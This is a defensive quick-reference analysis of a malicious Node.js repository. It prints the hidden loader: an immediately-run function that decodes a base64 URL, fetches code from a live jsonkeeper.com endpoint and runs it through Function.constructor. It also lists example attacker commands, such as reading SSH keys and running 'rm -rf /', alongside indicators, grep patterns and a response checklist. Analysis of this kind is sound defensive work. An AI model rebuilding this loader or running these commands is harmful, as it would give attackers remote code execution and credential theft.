# Quick Reference: Malicious Code Analysis

## TL;DR - CRITICAL FINDINGS

**⚠️ DO NOT RUN `npm run dev` ON THIS REPOSITORY ⚠️**

### What Happens When You Run `npm run dev`?

1. **Server starts** → `node server/app.js`
2. **Utils loaded** → `require('./utils')`
3. **Malicious module loads** → `require('./sendGmail')`
4. **Code executes IMMEDIATELY** → IIFE pattern
5. **Fetches remote code** → `axios.get('https://jsonkeeper.com/b/CYLMK')`
6. **Executes arbitrary code** → `Function.constructor`
7. **💀 System Compromised**

**Total Time**: Less than 2 seconds from command to compromise

---

## Malicious Files

| File | Purpose | Severity |
|------|---------|----------|
| `server/utils/sendGmail.js` | Remote code execution | CRITICAL |
| `server/data/products.json` | Stores obfuscated malicious URLs | HIGH |
| `server/utils/index.js` | Loads malicious module | MEDIUM |

---

## Key Malicious Code Snippets

### The IIFE (Immediately Invoked Function Expression)
```javascript
// server/utils/sendGmail.js line 4-37
const sendGmail = (async () => {
    // This code runs IMMEDIATELY when the file is loaded
    // Not when a function is called
})()  // ← The () here makes it execute instantly
```

### The Obfuscated Data
```javascript
// server/data/products.json (last item)
{
  "title": "eC1zZWNyZXQta2V5",           // Base64 for "x-secret-key"
  "imageUrl": "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L", // Base64 for URL
  "description": "Xw==",                 // Base64 for "_"
  "price": "120000"                      // High price to be selected
}
```

### The Decoder
```javascript
// server/utils/sendGmail.js lines 24-26
const realImageUrl = atob(first.imageUrl);     // Decode base64
const realTitle = atob(first.title);           
const realDescription = atob(first.description);
```

### The Remote Code Fetch
```javascript
// server/utils/sendGmail.js line 27
const image = (await axios.get(realImageUrl, {
    headers: {[realTitle]: realDescription}
})).data.cookie;

// Translates to:
// GET https://jsonkeeper.com/b/CYLMK
// Headers: { "x-secret-key": "_" }
// Returns malicious code in response.data.cookie
```

### The Code Execution
```javascript
// server/utils/sendGmail.js lines 28-29
const parseImage = new (Function.constructor)('require', image);
parseImage(require);

// Equivalent to eval() but harder to detect
// Executes whatever code the remote server returned
// Gives attacker access to require() and full Node.js capabilities
```

---

## Decoded Malicious Values

| Encoded (Base64) | Decoded Value | Purpose |
|------------------|---------------|---------|
| `eC1zZWNyZXQta2V5` | `x-secret-key` | HTTP header name |
| `aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L` | `https://jsonkeeper.com/b/CYLMK` | Malicious server URL |
| `Xw==` | `_` | HTTP header value |

---

## Attack Indicators (IOCs)

### File Indicators
- ✓ IIFE pattern: `(async () => { ... })()`
- ✓ Function constructor: `Function.constructor`
- ✓ Base64 decoding: `atob()`
- ✓ External HTTP requests in utility files
- ✓ Unused require statements (loaded for side effects)
- ✓ Misleading function/file names

### Network Indicators
- ✓ Outbound connection to: `jsonkeeper.com`
- ✓ Custom HTTP header: `x-secret-key: _`
- ✓ Suspicious endpoint: `/b/CYLMK`

### Behavioral Indicators
- ✓ Code execution on module load (not on function call)
- ✓ Dynamic code evaluation
- ✓ Obfuscated configuration data
- ✓ Comments suggesting different functionality than actual code

---

## What Can The Attacker Do?

With `require()` access, the attacker can:

| Capability | Risk Level | Example |
|-----------|-----------|---------|
| Read files | CRITICAL | `require('fs').readFileSync('~/.ssh/id_rsa')` |
| Write files | CRITICAL | `require('fs').writeFileSync('/etc/hosts', ...)` |
| Execute commands | CRITICAL | `require('child_process').exec('rm -rf /')` |
| Access env vars | CRITICAL | `process.env.AWS_SECRET_ACCESS_KEY` |
| Network access | HIGH | Exfiltrate data, C&C communication |
| Install packages | HIGH | `require('child_process').exec('npm install malware')` |
| Modify code | HIGH | Inject backdoors into your source |
| Access git | HIGH | `require('child_process').exec('git push')` |

---

## How To Identify Similar Attacks

### Search Patterns

**Search for IIFEs:**
```bash
grep -r "(async \?\(\) => {" .
grep -r "})()" .
```

**Search for Function constructor:**
```bash
grep -r "Function.constructor" .
grep -r "new Function" .
```

**Search for eval:**
```bash
grep -r "eval(" .
```

**Search for base64:**
```bash
grep -r "atob(" .
grep -r "btoa(" .
grep -r "Buffer.from.*base64" .
```

**Search for requires in non-code files:**
```bash
grep -r "require(" --include="*.json"
```

### Code Review Checklist

- [ ] Check all `require()` statements - are they all used?
- [ ] Look for functions that execute immediately (IIFEs)
- [ ] Search for `eval`, `Function`, `Function.constructor`
- [ ] Check for base64 encoded strings
- [ ] Review all external HTTP/HTTPS requests
- [ ] Verify purpose of all utility files
- [ ] Check package.json scripts for suspicious commands
- [ ] Review all files loaded in entry points (app.js, index.js)

---

## Emergency Response Checklist

If you've already run this code:

### Immediate Actions (Next 5 minutes)
- [ ] Disconnect from network (pull ethernet cable / disable WiFi)
- [ ] Kill all Node.js processes: `pkill -9 node`
- [ ] Document what you did and when

### Short Term (Next 30 minutes)
- [ ] From another device, change passwords for:
  - [ ] GitHub
  - [ ] npm
  - [ ] Cloud providers (AWS, Azure, GCP)
  - [ ] Email
  - [ ] Critical services
- [ ] Revoke and regenerate:
  - [ ] SSH keys
  - [ ] API tokens
  - [ ] Personal access tokens
  - [ ] Service credentials

### Medium Term (Next 2 hours)
- [ ] Run antivirus/malware scan
- [ ] Check running processes: `ps aux | grep -v "\["`
- [ ] Check network connections: `netstat -tupln` or `lsof -i`
- [ ] Check cron jobs: `crontab -l` and `/etc/cron*`
- [ ] Check for new users: `cat /etc/passwd`
- [ ] Check bash history: `cat ~/.bash_history`
- [ ] Review system logs: `/var/log/syslog`, `/var/log/auth.log`

### Long Term (Next 24 hours)
- [ ] Monitor accounts for unauthorized access
- [ ] Check GitHub/GitLab for unauthorized commits
- [ ] Check npm for unauthorized package publishes
- [ ] Review cloud resource usage
- [ ] Consider clean OS reinstall if critical system
- [ ] Restore from known-good backups if available
- [ ] Enable 2FA on all accounts if not already enabled

---

## Prevention Tips

1. **Never run untrusted code** - especially code that warns you not to run it!
2. **Use sandboxes** - VMs, containers, or cloud sandboxes for testing
3. **Review before running** - Always read code before executing
4. **Watch for red flags**:
   - Warnings in README ("do not run", "hacking script")
   - Obfuscated code (base64, hex encoding)
   - IIFEs in utility files
   - Unused requires
   - External network requests in unexpected places
5. **Use security tools**:
   - `npm audit`
   - Static analysis tools (ESLint with security plugins)
   - Dependency scanners
6. **Principle of least privilege** - Don't run as root/admin
7. **Keep backups** - Regular, tested backups of important data

---

## Technical Details

### Execution Flow
```
npm run dev
  → server/app.js
    → require('./utils')
      → require('./sendGmail')  [IIFE EXECUTES]
        → atob() decode
          → axios.get() remote fetch
            → Function.constructor()
              → parseImage(require) [RCE]
                → 💀 COMPROMISED
```

### Time to Compromise
**< 2 seconds** from command execution to system compromise

### Required User Actions
**NONE** - Fully automated attack

### Attack Classification
- **Type**: Remote Code Execution (RCE)
- **Vector**: Supply Chain / Malicious Dependency
- **Stealth**: Obfuscated, automatic execution
- **Impact**: Full system compromise
- **MITRE ATT&CK**: T1059.007 (JavaScript Execution)

---

## Additional Resources

For complete details, see:
- `SECURITY_ANALYSIS.md` - Comprehensive security analysis
- `ATTACK_FLOW_DIAGRAM.md` - Visual flow diagrams
- This file - Quick reference guide

---

## Contact & Reporting

If you find similar attacks:
- Report to repository owner
- Report to GitHub Security
- Report to npm security team
- File CVE if applicable

---

**Last Updated**: 2025-12-23  
**Analysis Version**: 1.0  
**Severity**: CRITICAL
